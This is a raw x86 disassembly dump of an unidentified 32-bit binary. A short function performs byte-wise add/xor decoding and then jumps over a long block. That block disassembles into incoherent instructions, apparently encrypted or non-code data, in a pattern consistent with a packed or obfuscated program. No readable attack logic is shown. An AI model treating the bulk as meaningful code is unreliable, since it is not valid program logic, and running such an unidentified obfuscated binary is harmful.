  40f74c:	xchg   DWORD PTR [esi+0x2e],ecx
  40f74f:	test   al,0xe5
  40f751:	ret    0x9d2b
  40f754:	(bad)  
  40f755:	fcomip st,st(7)
  40f757:	mov    eax,ds:0x5a03f76f
  40f75c:	mov    eax,DWORD PTR [ebp-0x8]
  40f75f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f762:	add    ecx,DWORD PTR [eax]
  40f764:	mov    DWORD PTR [ebp-0x24],ecx
  40f767:	mov    eax,DWORD PTR [ebp-0x24]
  40f76a:	mov    ecx,DWORD PTR [ebp-0x8]
  40f76d:	mov    eax,DWORD PTR [eax+0xc]
  40f770:	mov    ecx,DWORD PTR [ecx]
  40f772:	mov    al,BYTE PTR [eax+ecx*1]
  40f775:	add    al,0x37
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0x361d46f3
  40f7e3:	mov    ah,0xfd
  40f7e5:	pop    edi
  40f7e6:	mov    ch,0x70
  40f7e8:	jo     0x40f78d
  40f7ea:	jge    0x40f85c
  40f7ec:	jo     0x40f7b5
  40f7ee:	pop    esi
  40f7ef:	cmpps  xmm4,XMMWORD PTR [esi],0x82
  40f7f3:	in     al,0x60
  40f7f5:	or     cl,dh
  40f7f7:	sbb    ebx,esi
  40f7f9:	stos   DWORD PTR es:[edi],eax
  40f7fa:	mov    bh,0xc1
  40f7fc:	ficomp WORD PTR [ebx+0x79]
  40f7ff:	mov    cl,BYTE PTR [edi]
  40f801:	mov    ds:0x55859039,eax
  40f806:	and    al,0x93
  40f808:	mov    bl,0x7f
  40f80a:	mov    ch,0x4
  40f80c:	mov    cl,0x43
  40f80e:	sbb    al,BYTE PTR [eax]
  40f810:	icebp  
  40f811:	mov    dl,0xba
  40f813:	pop    esp
  40f814:	mov    ebp,DWORD PTR [esi]
  40f816:	sbb    eax,0x60762577
  40f81b:	mov    WORD PTR [eax+0x68f82697],fs
  40f821:	sbb    dh,BYTE PTR [ecx]
  40f823:	aam    0x3
  40f825:	xchg   edi,eax
  40f826:	lahf   
  40f827:	mov    ah,0x7a
  40f829:	bound  esi,QWORD PTR [ebp-0x6e240378]
  40f82f:	in     al,dx
  40f830:	ins    BYTE PTR es:[edi],dx
  40f831:	fs jno 0x40f7ea
  40f834:	xor    al,0x53
  40f836:	pop    ds
  40f837:	cmp    eax,0x165ba94d
  40f83c:	push   eax
  40f83d:	cdq    
  40f83e:	jge    0x40f850
  40f840:	push   ds
  40f841:	cli    
  40f842:	repz push ebp
  40f844:	jle    0x40f88e
  40f846:	pop    ss
  40f847:	lock cmp bh,BYTE PTR [edx-0x43]
  40f84b:	cmp    edx,DWORD PTR [edx-0x19]
  40f84e:	sub    al,0x19
  40f850:	and    bh,bh
  40f852:	push   esp
  40f853:	pop    ebp
  40f854:	mov    edi,0xea3453e9
  40f859:	inc    edi
  40f85a:	ret    
  40f85b:	jnp    0x40f8b4
  40f85d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f85e:	jmp    0x6715:0x3ad68004
  40f865:	inc    edi
  40f866:	jge    0x40f8e4
  40f868:	hlt    
  40f869:	rol    BYTE PTR [ecx+0x73],1
  40f86c:	sti    
  40f86d:	pop    esi
  40f86e:	paddusw mm7,mm1
  40f871:	mov    ch,0x9a
  40f873:	jecxz  0x40f89b
  40f875:	leave  
  40f876:	push   0x7f1026be
  40f87b:	in     al,dx
  40f87c:	cvtdq2ps xmm4,XMMWORD PTR [esi-0x2fd9cbd3]
  40f883:	aad    0x82
  40f885:	ins    BYTE PTR es:[edi],dx
  40f886:	dec    esi
  40f887:	call   0x381761b2
  40f88c:	adc    al,0x81
  40f88e:	xchg   ebp,eax
  40f88f:	fidivr WORD PTR [ebx-0x322d0f5f]
  40f895:	retf   0x24e3
  40f898:	jg     0x40f8da
  40f89a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f89b:	add    al,ah
  40f89d:	in     al,dx
  40f89e:	mov    WORD PTR [esi+0x7bee0917],cs
  40f8a4:	mov    eax,ds:0xaee92f73
  40f8a9:	add    al,0x8d
  40f8ab:	and    DWORD PTR ds:0xcbe615d7,0x22bd9015
  40f8b5:	call   0x4295:0x662ac155
  40f8bc:	pop    ds
  40f8bd:	(bad)  
  40f8be:	adc    al,0x84
  40f8c0:	sar    BYTE PTR [ebx-0x25],0x30
  40f8c4:	retf   0x9a65
  40f8c7:	into   
  40f8c8:	jo     0x40f88f
  40f8ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8cb:	mov    ch,0x6c
  40f8cd:	in     eax,0x16
  40f8cf:	repnz push esi
  40f8d1:	mov    al,ds:0x8dfeb321
  40f8d6:	sti    
  40f8d7:	inc    esi
  40f8d8:	scas   al,BYTE PTR es:[edi]
  40f8d9:	xchg   cl,al
  40f8db:	pop    esp
  40f8dc:	mov    dl,0xdf
  40f8de:	jecxz  0x40f8c5
  40f8e0:	test   al,0xa8
  40f8e2:	adc    al,0xe8
  40f8e4:	mov    ecx,0x7fbcdc6b
  40f8e9:	addr16 mov ebp,0x9551106d
  40f8ef:	imul   esp,DWORD PTR [edi+esi*4],0xb712b4dc
  40f8f6:	push   es
  40f8f7:	cmp    al,0x70
  40f8f9:	fcomp  QWORD PTR [ecx]
  40f8fb:	call   0x7ada512d
  40f900:	hlt    
  40f901:	dec    edx
  40f902:	out    dx,eax
  40f903:	pop    ss
  40f904:	inc    ebx
  40f905:	and    DWORD PTR [ebp+0x5a],edi
  40f908:	in     al,0x7a
  40f90a:	mov    dl,0x4f
  40f90c:	and    ch,BYTE PTR [esp+edx*1]
  40f90f:	jmp    0x40f947
  40f911:	adc    ecx,esi
  40f913:	jb     0x40f925
  40f915:	ins    DWORD PTR es:[edi],dx
  40f916:	repnz fisub DWORD PTR [eax-0x72db79d2]
  40f91d:	das    
  40f91e:	and    DWORD PTR [esp+esi*2],ecx
  40f921:	adc    BYTE PTR [ebx-0x130c315e],ch
  40f927:	pop    ebp
  40f928:	adc    DWORD PTR [ebp+0x68],eax
  40f92b:	popa   
  40f92c:	test   al,0x89
  40f92e:	ins    BYTE PTR es:[edi],dx
  40f92f:	pop    esp
  40f930:	sahf   
  40f931:	scas   al,BYTE PTR es:[edi]
  40f932:	adc    al,0xcb
  40f934:	push   ecx
  40f935:	push   esi
  40f936:	popa   
  40f937:	jae    0x40f907
  40f939:	int3   
  40f93a:	mov    eax,0x411aea70
  40f93f:	xchg   ebp,eax
  40f940:	pop    eax
  40f941:	les    esp,FWORD PTR [edx-0x8]
  40f944:	or     edx,ecx
  40f946:	mov    cs:0xbca03fe6,eax
  40f94c:	(bad)  
  40f94d:	(bad)  
  40f94f:	adc    ch,BYTE PTR [ebp+ebx*4+0x2c]
  40f953:	sbb    dl,BYTE PTR [ebx-0x4e9bbe9d]
  40f959:	out    0x8a,al
  40f95b:	adc    DWORD PTR [ecx+esi*2],esi
  40f95e:	inc    edi
  40f95f:	mov    esp,0xae7187a7
  40f964:	or     BYTE PTR [edx],0xa0
  40f967:	sub    eax,0x817d8305
  40f96c:	loop   0x40f93c
  40f96e:	repz mov ecx,0x5a9d558a
  40f974:	push   edx
  40f975:	pop    ecx
  40f976:	lea    ebp,[esi]
  40f978:	popf   
  40f979:	addr16 test bl,0x8b
  40f97d:	test   ah,cl
  40f97f:	pop    ebx
  40f980:	jmp    0x40f9ab
  40f982:	jle    0x40f9ac
  40f984:	cmp    BYTE PTR [edx+0x6a],ah
  40f987:	outs   dx,DWORD PTR ds:[esi]
  40f988:	(bad)  
  40f989:	mov    eax,0xac85a066
  40f98e:	mov    dl,0x6b
  40f990:	mov    ds:0x60336d96,al
  40f995:	mov    eax,esi
  40f997:	mov    dh,0x6e
  40f999:	fldlg2 
  40f99b:	lahf   
  40f99c:	stos   BYTE PTR es:[edi],al
  40f99d:	out    dx,al
  40f99e:	in     eax,dx
  40f99f:	dec    esi
  40f9a0:	dec    ebp
  40f9a1:	cmc    
  40f9a2:	jl     0x40f941
  40f9a4:	pop    ebp
  40f9a5:	push   ecx
  40f9a6:	and    eax,0x2bffe016
  40f9ab:	fwait
  40f9ac:	push   esp
  40f9ad:	cmp    DWORD PTR [eax+eax*1+0x1732c6d2],edx
  40f9b4:	hlt    
  40f9b5:	rcr    DWORD PTR [eax+0x128b9f1b],0x9a
  40f9bc:	jecxz  0x40f9d9
  40f9be:	sbb    BYTE PTR [ebp-0x13],cl
  40f9c1:	fimul  WORD PTR [edx-0x2437da05]
  40f9c7:	adc    BYTE PTR [ebp-0x24eeb617],ch
  40f9cd:	data16 (bad) 
  40f9cf:	xor    DWORD PTR [edx],esi
  40f9d1:	lods   al,BYTE PTR ds:[esi]
  40f9d2:	lock addr16 and al,0x47
  40f9d6:	cdq    
  40f9d7:	or     eax,0x5f61e9dd
  40f9dc:	xor    ch,BYTE PTR [ecx]
  40f9de:	stos   DWORD PTR es:[edi],eax
  40f9df:	clc    
  40f9e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9e1:	mov    esi,DWORD PTR [edi]
  40f9e3:	lds    edx,FWORD PTR [ebx]
  40f9e5:	stos   BYTE PTR es:[edi],al
  40f9e6:	and    BYTE PTR [eax],cl
  40f9e8:	int3   
  40f9e9:	in     eax,dx
  40f9ea:	xor    ah,BYTE PTR [edi-0x5372aa08]
  40f9f0:	and    BYTE PTR [edx-0x224ca258],dl
  40f9f6:	xor    BYTE PTR [eax],0xb4
  40f9f9:	(bad)  
  40f9fa:	repnz or BYTE PTR [esi+0x469a3198],0xbb
  40fa02:	fs jne 0x40f9ac
  40fa05:	loope  0x40fa32
  40fa07:	es je  0x40fa05
  40fa0a:	loop   0x40fa77
  40fa0c:	cli    
  40fa0d:	pop    es
  40fa0e:	jb     0x40f9f4
  40fa10:	add    DWORD PTR [esi-0x7d],ecx
  40fa13:	cmp    DWORD PTR [edi+0x6e],esp
  40fa16:	sbb    al,0xc2
  40fa18:	gs ss sub bh,ah
  40fa1c:	in     al,dx
  40fa1d:	inc    bx
  40fa1f:	jb     0x40fa0d
  40fa21:	call   FWORD PTR [edi+0x3]
  40fa24:	xchg   ebx,eax
  40fa25:	xchg   edi,eax
  40fa26:	stos   DWORD PTR es:[edi],eax
  40fa27:	retf   
  40fa28:	scas   al,BYTE PTR es:[edi]
  40fa29:	popa   
  40fa2a:	add    edi,ebx
  40fa2c:	fcomp  st(7)
  40fa2e:	iret   
  40fa2f:	arpl   WORD PTR [ebp+0x76],dx
  40fa32:	sub    ch,bl
  40fa34:	push   0x2e29af11
  40fa39:	mov    ch,0x3f
  40fa3b:	sub    eax,DWORD PTR [edx]
  40fa3d:	in     eax,dx
  40fa3e:	dec    eax
  40fa3f:	push   ebx
  40fa40:	jb     0x40fa95
  40fa42:	test   DWORD PTR [esi+ebp*4+0x4e33f1de],ecx
  40fa49:	mov    eax,ds:0xfefb864d
  40fa4e:	mov    bl,0x3f
  40fa50:	cmc    
  40fa51:	out    0x4d,al
  40fa53:	dec    esp
  40fa54:	mov    eax,0x7760d122
  40fa59:	jle    0x40fad2
  40fa5b:	scas   eax,DWORD PTR es:[edi]
  40fa5c:	sub    eax,0x6015bac8
  40fa61:	xchg   DWORD PTR [esi],esp
  40fa63:	popa   
  40fa64:	out    0x60,al
  40fa66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa67:	jmp    0xc4ea:0xe85ce7b4
  40fa6e:	inc    ebx
  40fa6f:	mov    edx,0x32292bdc
  40fa74:	push   0xffffff92
  40fa76:	ja     0x40fa27
  40fa78:	add    DWORD PTR [esi+0x41f9ba44],edx
  40fa7e:	pop    ecx
  40fa7f:	mov    cl,0xcb
  40fa81:	push   edx
  40fa82:	cwde   
  40fa83:	lea    edi,[ecx+0x69b616c7]
  40fa89:	pop    ebp
  40fa8a:	push   ds
  40fa8b:	addr16 xor dl,dl
  40fa8e:	dec    ebp
  40fa8f:	adc    cl,BYTE PTR [ebx]
  40fa91:	shr    BYTE PTR [edx+ebp*8-0x15],1
  40fa95:	je     0x40fa43
  40fa97:	cmp    ebx,DWORD PTR [ecx]
  40fa99:	jecxz  0x40fa52
  40fa9b:	push   0xffffffbe
  40fa9d:	inc    ebp
  40fa9e:	lahf   
  40fa9f:	mov    eax,0x2de268f1
  40faa4:	sahf   
  40faa5:	cmp    al,0xe
  40faa7:	and    BYTE PTR [ebx-0x3b],al
  40faaa:	in     eax,0x69
  40faac:	fidivr DWORD PTR [edx]
  40faae:	ins    BYTE PTR es:[edi],dx
  40faaf:	sbb    DWORD PTR [ebp+0x76],eax
  40fab2:	int3   
  40fab3:	imul   edx,ebx,0x4a0e36f9
  40fab9:	addr16 (bad) 
  40fabb:	fst    QWORD PTR [ebx]
  40fabd:	ins    BYTE PTR es:[edi],dx
  40fabe:	call   0xcce5:0x5162be5f
  40fac5:	sbb    edi,DWORD PTR [edi+esi*2+0x218977fd]
  40facc:	xor    ebx,DWORD PTR [edx]
  40face:	clc    
  40facf:	std    
  40fad0:	cmc    
  40fad1:	push   ss
  40fad2:	jp     0x40fabd
  40fad4:	pop    esi
  40fad5:	cli    
  40fad6:	push   ebx
  40fad7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fad8:	dec    ebp
  40fad9:	ret    0x6acd
  40fadc:	or     eax,0xf82f14fd
  40fae1:	retf   
  40fae2:	dec    edx
  40fae3:	cmp    al,ah
  40fae5:	pop    edx
  40fae6:	lea    ecx,[edx-0x6f]
  40fae9:	pop    esi
  40faea:	dec    edi
  40faeb:	or     bh,BYTE PTR [eax+0x35bcc409]
  40faf1:	push   sp
  40faf3:	or     bl,BYTE PTR [edx+0x1c]
  40faf6:	push   edx
  40faf7:	hlt    
  40faf8:	fist   DWORD PTR [esi]
  40fafa:	xlat   BYTE PTR ds:[ebx]
  40fafb:	test   eax,0xcbb327ed
  40fb00:	pop    ecx
  40fb01:	les    esi,FWORD PTR [edi+0x3a82b38d]
  40fb07:	repnz shl DWORD PTR [edi+0x4d],cl
  40fb0b:	cs (bad) 
  40fb0d:	push   0x7b9f73e8
  40fb12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb13:	cli    
  40fb14:	and    al,0x5f
  40fb16:	cs inc esi
  40fb18:	retf   
  40fb19:	hlt    
  40fb1a:	(bad)  
  40fb1b:	cs jno 0x40fae2
  40fb1e:	sbb    al,ch
  40fb20:	and    BYTE PTR [eax+ebx*4-0x12d86c12],ch
  40fb27:	mul    BYTE PTR [esi+0x179fea8d]
  40fb2d:	inc    edi
  40fb2e:	int3   
  40fb2f:	push   ss
  40fb30:	retf   0x5dbe
  40fb33:	xchg   ebx,eax
  40fb34:	lea    esp,[edi-0x1a]
  40fb37:	jnp    0x40fb34
  40fb39:	sub    BYTE PTR [eax+0x6c],ah
  40fb3c:	inc    eax
  40fb3d:	ret    0x7189
  40fb40:	xchg   esi,eax
  40fb41:	pop    es
  40fb42:	mov    dl,0x5d
  40fb44:	fs fild WORD PTR ss:[edi+0x17a3b497]
  40fb4c:	mov    WORD PTR [ecx],ss
  40fb4e:	mov    ah,0xd7
  40fb50:	call   0x40d6:0x34b6739
  40fb57:	pusha  
  40fb58:	xor    DWORD PTR [edi-0x5f2160f7],ebp
  40fb5e:	adc    edi,edi
  40fb60:	imul   esi,DWORD PTR [ecx],0xddf846f8
  40fb66:	(bad)  
  40fb67:	fld    DWORD PTR ds:0xfa56e931
  40fb6d:	imul   esp,DWORD PTR [edi+0x1fe45c4e],0x88927eba
  40fb77:	aaa    
  40fb78:	and    cl,BYTE PTR [edx+0x26]
  40fb7b:	lds    esi,FWORD PTR [ecx-0x3d]
  40fb7e:	add    DWORD PTR cs:[ebx+edi*4],eax
  40fb82:	(bad)
  40fb85:	and    eax,0xc335a3a5
  40fb8a:	iret   
  40fb8b:	aad    0x1d
  40fb8d:	dec    eax
  40fb8e:	imul   esi,DWORD PTR [ecx],0x2d8925dc
  40fb94:	in     eax,dx
  40fb95:	jg     0x40fb78
  40fb97:	mov    edi,0xf75106fc
  40fb9c:	sbb    eax,0x42e124
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0xce
  40fbb3:	pop    ebx
  40fbb4:	in     eax,0xb4
  40fbb6:	xor    BYTE PTR [ecx+0x7da37070],0x70
  40fbbd:	jo     0x40fba7
  40fbbf:	add    eax,0xea6e7990
  40fbc4:	popf   
  40fbc5:	inc    esp
  40fbc6:	sbb    esi,edi
  40fbc8:	xor    al,0x2f
  40fbca:	mov    bh,0xbe
  40fbcc:	rol    DWORD PTR [eax+0x48],cl
  40fbcf:	popa   
  40fbd0:	outs   dx,DWORD PTR ds:[esi]
  40fbd1:	mov    bl,BYTE PTR [edi]
  40fbd3:	mov    bl,0xd3
  40fbd5:	or     eax,DWORD PTR [ebp-0x77994769]
  40fbdb:	mov    dh,0xac
  40fbdd:	out    0x26,eax
  40fbdf:	push   ss
  40fbe0:	cwde   
  40fbe1:	fld    TBYTE PTR [ecx+0x75]
  40fbe4:	adc    ecx,DWORD PTR [esi]
  40fbe6:	lahf   
  40fbe7:	pop    ecx
  40fbe8:	ss dec ebp
  40fbea:	push   0x16
  40fbec:	sub    bh,BYTE PTR [esi+0x1ff9325a]
  40fbf2:	or     esi,DWORD PTR [ebx]
  40fbf4:	xor    DWORD PTR [esi-0x58db79e],eax
  40fbfa:	push   ecx
  40fbfb:	lods   eax,DWORD PTR ds:[esi]
  40fbfc:	pop    ds
  40fbfd:	pop    ecx
  40fbfe:	pop    ebx
  40fbff:	lock push 0xd
  40fc02:	add    DWORD PTR [ebx-0x91149b9],eax
  40fc08:	lods   al,BYTE PTR ds:[esi]
  40fc09:	xlat   BYTE PTR ds:[ebx]
  40fc0a:	sub    DWORD PTR [ecx],0xa64ef435
  40fc10:	adc    eax,0xed073e64
  40fc15:	fnstenv [edi+0x12]
  40fc18:	inc    eax
  40fc19:	shr    ch,cl
  40fc1b:	test   ah,al
  40fc1d:	pushf  
  40fc1e:	xchg   edi,eax
  40fc1f:	stos   DWORD PTR es:[edi],eax
  40fc20:	and    al,0x56
  40fc22:	(bad)
  40fc26:	retf   0x7596
  40fc29:	pushf  
  40fc2a:	out    0xaf,eax
  40fc2c:	hlt    
  40fc2d:	pusha  
  40fc2e:	xchg   edx,edx
  40fc30:	mov    cs,WORD PTR [edx-0x68]
  40fc33:	push   0x2e19ee99
  40fc38:	pop    esp
  40fc39:	and    al,0x21
  40fc3b:	leave  
  40fc3c:	and    eax,0xc0b5a781
  40fc41:	jb     0x40fc29
  40fc43:	scas   al,BYTE PTR es:[edi]
  40fc44:	call   edi
  40fc46:	fld    QWORD PTR [ebx]
  40fc48:	jg     0x40fc2b
  40fc4a:	div    BYTE PTR [esp+esi*4+0x34]
  40fc4e:	(bad)  
  40fc4f:	xor    esi,DWORD PTR [eax]
  40fc51:	mov    dh,0x8e
  40fc53:	aad    0x83
  40fc55:	scas   eax,DWORD PTR es:[edi]
  40fc56:	adc    bl,BYTE PTR [eax-0x34]
  40fc59:	push   ebp
  40fc5a:	fld    TBYTE PTR [ecx+0x6b3d067c]
  40fc60:	mov    ds:0xbf1e95ce,eax
  40fc65:	test   eax,0x24a6c6c0
  40fc6a:	outs   dx,BYTE PTR ds:[esi]
  40fc6b:	(bad)  
  40fc6c:	mov    eax,ds:0x5625ea5e
  40fc71:	mov    cl,0xf3
  40fc73:	fisubr DWORD PTR [edi+0x0]
  40fc76:	bound  eax,QWORD PTR [edi-0x6aa2c2f8]
  40fc7c:	dec    edx
  40fc7d:	inc    ebx
  40fc7e:	imul   edi,DWORD PTR [ebp-0x3d],0x81a949c8
  40fc85:	xchg   edi,eax
  40fc86:	test   al,0x60
  40fc88:	setne  cl
  40fc8b:	inc    edi
  40fc8c:	das    
  40fc8d:	push   ebx
  40fc8e:	and    BYTE PTR [ebx+0x71f9fb05],bh
  40fc94:	scas   al,BYTE PTR es:[edi]
  40fc95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc96:	stc    
  40fc97:	div    DWORD PTR [ebx-0x2b408bd0]
  40fc9d:	test   DWORD PTR [ebx-0x18],ebx
  40fca0:	pushf  
  40fca1:	jecxz  0x40fc3e
  40fca3:	or     DWORD PTR [ecx+0x191ca051],0x50201a99
  40fcad:	pop    edi
  40fcae:	cmp    al,0xc0
  40fcb0:	xor    DWORD PTR [ecx],edx
  40fcb2:	pop    ds
  40fcb3:	sbb    BYTE PTR [ecx-0x36],ch
  40fcb6:	push   ebp
  40fcb7:	in     eax,0x5f
  40fcb9:	stos   BYTE PTR es:[edi],al
  40fcba:	dec    ebp
  40fcbb:	xchg   edx,esi
  40fcbd:	adc    ch,BYTE PTR [eax+0x20a0a082]
  40fcc3:	test   al,0xe0
  40fcc5:	cmc    
  40fcc6:	les    ebx,FWORD PTR [esi]
  40fcc8:	xchg   edi,eax
  40fcc9:	mov    cl,ah
  40fccb:	push   es
  40fccc:	sar    DWORD PTR [ebx-0xc35b1d0],1
  40fcd2:	nop
  40fcd3:	arpl   WORD PTR [ecx-0x43],ax
  40fcd6:	mov    ebp,0x92a5f937
  40fcdb:	or     edx,0x2e
  40fcde:	adc    al,0x75
  40fce0:	and    DWORD PTR es:[ebx-0x6d4fc95c],ecx
  40fce7:	add    BYTE PTR [edi+0x0],0xf9
  40fceb:	push   cs
  40fcec:	ret    
  40fced:	mov    ah,0xfb
  40fcef:	ins    BYTE PTR es:[edi],dx
  40fcf0:	ror    DWORD PTR [edi+0x47],1
  40fcf3:	neg    BYTE PTR [edx-0x5a]
  40fcf6:	push   ecx
  40fcf7:	lods   eax,DWORD PTR ds:[esi]
  40fcf8:	loope  0x40fd2b
  40fcfa:	int    0x78
  40fcfc:	out    dx,al
  40fcfd:	leave  
  40fcfe:	rcl    esi,0xee
  40fd01:	or     BYTE PTR [edi+0x22],dl
  40fd04:	add    BYTE PTR [ebp+0x42a3bcc5],cl
  40fd0a:	inc    eax
  40fd0b:	dec    edx
  40fd0c:	vmptrst QWORD PTR [esi+0x4]
  40fd10:	(bad)  
  40fd11:	xchg   si,ax
  40fd13:	add    bl,dl
  40fd15:	test   al,0xb
  40fd17:	inc    edx
  40fd18:	xor    BYTE PTR [esi-0x3f],dl
  40fd1b:	jg     0x40fcf9
  40fd1d:	and    eax,0xb81baf5b
  40fd22:	frstor [ebx-0x68158449]
  40fd28:	ss loopne 0x40fcbb
  40fd2b:	out    dx,al
  40fd2c:	push   0x73
  40fd2e:	jmp    0x40fd61
  40fd30:	adc    edx,DWORD PTR [ebp-0x3e635ec5]
  40fd36:	mov    ecx,0x302251be
  40fd3b:	mov    al,0x9d
  40fd3d:	mov    ebp,0xa8e091cc
  40fd42:	jne    0x40fd8c
  40fd44:	icebp  
  40fd45:	mov    cl,0x5b
  40fd47:	int3   
  40fd48:	inc    ebp
  40fd49:	sub    ah,dh
  40fd4b:	adc    esi,DWORD PTR [ebp+0x47333100]
  40fd51:	adc    DWORD PTR [edi+0x716372b4],ebp
  40fd57:	add    al,0x9d
  40fd59:	add    bh,BYTE PTR [eax-0x42]
  40fd5c:	das    
  40fd5d:	icebp  
  40fd5e:	inc    ebx
  40fd5f:	addr16 in eax,0x6a
  40fd62:	mov    edx,DWORD PTR [ebp+0xd0c376]
  40fd68:	pop    ecx
  40fd69:	stos   BYTE PTR es:[edi],al
  40fd6a:	push   0x25
  40fd6c:	mov    BYTE PTR [ebx],al
  40fd6e:	ret    
  40fd6f:	fwait
  40fd70:	push   edx
  40fd71:	and    al,0xce
  40fd73:	rcr    BYTE PTR ds:0x9daa592b,0x74
  40fd7a:	mov    cl,0xa9
  40fd7c:	std    
  40fd7d:	int3   
  40fd7e:	jg     0x40fdac
  40fd80:	pop    es
  40fd81:	lods   eax,DWORD PTR ds:[esi]
  40fd82:	push   eax
  40fd83:	add    DWORD PTR [ecx+0x665b6f52],ecx
  40fd89:	(bad)  
  40fd8a:	in     al,0x2
  40fd8c:	(bad)  
  40fd8d:	jmp    0xe2568899
  40fd92:	(bad)  
  40fd93:	and    eax,0x811bb37d
  40fd98:	shr    BYTE PTR [edi-0x78431bf6],1
  40fd9e:	nop
  40fd9f:	mov    esp,0xa217897f
  40fda4:	jnp    0x40fd70
  40fda6:	pop    ebp
  40fda7:	pop    ss
  40fda8:	push   0xffffff8c
  40fdaa:	xor    BYTE PTR [ebx],bl
  40fdac:	iret   
  40fdad:	cmp    eax,0x3dbfa3f1
  40fdb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdb3:	pop    edx
  40fdb4:	ds jbe 0x40fdfe
  40fdb7:	xor    esi,edx
  40fdb9:	pop    ss
  40fdba:	in     al,0xca
  40fdbc:	adc    eax,0x406bc394
  40fdc1:	push   ds
  40fdc2:	jecxz  0x40fe20
  40fdc4:	pop    ecx
  40fdc5:	xchg   edi,eax
  40fdc6:	add    bh,ch
  40fdc8:	in     eax,dx
  40fdc9:	mov    ebp,0xe6465beb
  40fdce:	mov    ch,0x25
  40fdd0:	rcr    dl,1
  40fdd2:	imul   esp,DWORD PTR [ecx+0x433ed492],0x40
  40fdd9:	inc    ebp
  40fdda:	sub    eax,0xd3535d56
  40fddf:	mov    dl,0xe8
  40fde1:	hlt    
  40fde2:	add    cl,BYTE PTR [esi-0x6f]
  40fde5:	add    DWORD PTR [ecx-0x37],ebx
  40fde8:	imul   ebx,DWORD PTR [eax+0x7538bfb9],0x56e5100f
  40fdf2:	mov    cl,0xcd
  40fdf4:	cmc    
  40fdf5:	jns    0x40fe20
  40fdf7:	lahf   
  40fdf8:	call   DWORD PTR [ecx+eiz*1-0x79]
  40fdfc:	and    eax,DWORD PTR [edx]
  40fdfe:	inc    edx
  40fdff:	jo     0x40fe51
  40fe01:	pop    eax
  40fe02:	fcomp  DWORD PTR [eax+0x2f]
  40fe05:	leave  
  40fe06:	jnp    0x40fe67
  40fe08:	jb     0x40fe7a
  40fe0a:	outs   dx,DWORD PTR ds:[esi]
  40fe0b:	cwde   
  40fe0c:	in     eax,dx
  40fe0d:	pop    eax
  40fe0e:	sub    eax,0x181588ef
  40fe13:	sbb    al,ah
  40fe15:	rcl    ah,0x21
  40fe18:	cmp    edi,DWORD PTR [ecx]
  40fe1a:	sub    eax,0xec940a2a
  40fe1f:	aas    
  40fe20:	shl    BYTE PTR [ebx-0x7c],1
  40fe23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe24:	mov    edx,DWORD PTR [edi]
  40fe26:	mov    ds:0xa984960c,al
  40fe2b:	fs or  ch,cl
  40fe2e:	push   esp
  40fe2f:	ins    BYTE PTR es:[edi],dx
  40fe30:	jge    0x40fdc3
  40fe32:	lea    edi,[esi-0x5c]
  40fe35:	mov    al,0xc
  40fe37:	mov    esi,0x85f1f358
  40fe3c:	cmp    eax,0xefec593c
  40fe41:	jmp    0x40fe83
  40fe43:	fwait
  40fe44:	inc    eax
  40fe45:	adc    dl,BYTE PTR [ebx+0x35]
  40fe48:	stos   DWORD PTR es:[edi],eax
  40fe49:	das    
  40fe4a:	jno    0x40fe1f
  40fe4c:	mov    ah,0xfe
  40fe4e:	enter  0xdc8d,0xdb
  40fe52:	xor    ebx,DWORD PTR [edx]
  40fe54:	hlt    
  40fe55:	xor    bh,BYTE PTR [ebp+0x33]
  40fe58:	fs jno 0x40fe84
  40fe5b:	mov    esi,DWORD PTR [edi-0x3ee7f87c]
  40fe61:	cmp    BYTE PTR [ebp-0x29],al
  40fe64:	jg     0x40fec8
  40fe66:	xor    ebp,ebx
  40fe68:	sub    bh,BYTE PTR [ecx-0x1b0702f5]
  40fe6e:	(bad)  [ebp-0x3a]
  40fe71:	test   BYTE PTR [edx+0x38],0x50
  40fe75:	mov    edx,DWORD PTR [esi]
  40fe77:	jp     0x40fec8
  40fe79:	jmp    0xb47e4acc
  40fe7e:	fbld   TBYTE PTR gs:[edi+0x173ecb59]
  40fe85:	push   ebx
  40fe86:	xlat   BYTE PTR ds:[ebx]
  40fe87:	add    BYTE PTR [ebx+0x89fa57],al
  40fe8d:	fcmove st,st(7)
  40fe8f:	inc    edx
  40fe90:	jne    0x40fed4
